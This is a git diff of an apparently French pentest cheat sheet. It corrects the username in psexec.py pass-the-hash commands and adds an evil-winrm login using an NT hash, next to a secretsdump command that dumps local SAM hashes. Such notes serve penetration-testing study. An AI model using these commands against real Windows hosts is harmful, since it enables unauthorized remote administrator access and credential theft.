@@ -27,10 +27,11 @@ secretdump.py local -sam sam.save -security security.save -system system.save LO
 ## Utilisation des Hash LM:NT
 ### Accès distant
 ``` shell 
-psexec.py Administratur@$TARGET_IP -hashes xxxxxxxxxxxxxxxxx:xxxxxxxxxxxxxxxxxxxxxxx
+psexec.py Administrator@$TARGET_IP -hashes xxxxxxxxxxxxxxxxx:xxxxxxxxxxxxxxxxxxxxxxx
 # ou
-psexec.py Administratur@$TARGET_IP -hashes :xxxxxxxxxxxxxxxxxxxxxxx
+psexec.py Administrator@$TARGET_IP -hashes :xxxxxxxxxxxxxxxxxxxxxxx
 # on peut également utiliser wmiexec.py et smbexec.py ou encore evil-winrm
+evil-winrm -i $TARGET_IP -u Administrator -H "64f12cddaa88057e06a81b54e73b949b"
 ```
 
 ### Cassage des hashs avec hashcat
